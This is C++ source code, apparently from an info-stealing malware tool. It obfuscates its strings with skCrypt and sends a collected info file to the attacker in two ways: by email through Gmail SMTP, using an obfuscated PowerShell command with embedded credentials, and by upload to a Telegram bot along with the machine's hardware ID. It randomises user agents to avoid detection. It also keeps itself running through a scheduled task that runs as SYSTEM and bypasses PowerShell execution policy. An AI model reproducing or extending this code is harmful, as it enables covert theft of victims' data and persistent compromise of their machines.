#include "headers.h"

using namespace std;
using Json = nlohmann::json;
namespace fs = std::experimental::filesystem;

extern vector<string> filesLink;

bool IsConnected2Internet() {
    return InternetCheckConnection(CA2W(skCrypt("http://www.google.com/")), FLAG_ICC_FORCE_CONNECTION, 0);
}

void SendEmail() {
    system(PowershellEncodedCommand(
        (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
        (string)skCrypt("' -tO '") + RECEIVERMAIL +
        (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
        (string)skCrypt("' -bodY '") + EMAILBODY +
        (string)skCrypt("' -AtTAchMenTs '") + INFOFILE +
        (string)skCrypt("' -sMtPsERveR 'smtp.gmail.com' -pOrt 587 -usESsl -creDentIAl (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '") + SENDERMAIL +
        (string)skCrypt("', (ConvertTo-SecureString '") + SENDERPSW +
        (string)skCrypt("' -AsPlainText -Force))")
    ).c_str());
}

void SendTelegram() {
    string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
    string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
    string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n") + CHAT_ID +
        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + GetHWID() +
        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + Split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
    string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
    string userAgent = userAgents[0];
    if (RANDOM_USERAGENT)
        userAgent = GetRandomUserAgent();

    ifstream rFile(INFOFILE, ios::in);
    stringstream buffer;
    buffer << rFile.rdbuf();
    rFile.close();
    string data = beggining + buffer.str() + ending;

    HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;

    hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hsession)
        goto cleanup;

    hconnect = InternetConnectA(hsession, skCrypt("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hconnect)
        goto cleanup;

    hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), ((string)skCrypt("/bot") + BOT_TOKEN + (string)skCrypt("/sendDocument")).c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hrequest)
        goto cleanup;

    if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
        goto cleanup;

    DWORD received;
    BYTE buf[1024];
    while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
        buf[received] = 0;
        char str[sizeof(buf) + 1];
        memcpy(str, buf, sizeof(buf));
        str[sizeof(buf)] = 0;
        filesLink.push_back(str);
        Json data = Json::parse(str);
        if (!data[(string)skCrypt("ok")] && DEBUG)
            cout << skCrypt("Info file not sent via telegram bot") << endl;
    }


cleanup:
    if (hsession)
        InternetCloseHandle(hsession);
    if (hconnect)
        InternetCloseHandle(hconnect);
    if (hrequest)
        InternetCloseHandle(hrequest);
}

void ScheduleTask() {
    system(((string)skCrypt("schtasks /delete /f /tn \"") + TASKNAME + (string)skCrypt("\"")).c_str());
    system(((string)skCrypt("schtasks /create /sc minute /mo ") + MINUTES + (string)skCrypt(" /f /ru \"SYSTEM\" /tn \"") + TASKNAME + (string)skCrypt("\" /tr \"powershell -noprofile -executionpolicy bypass -file '") + EMAILSENDER + (string)skCrypt("'\"")).c_str());
}
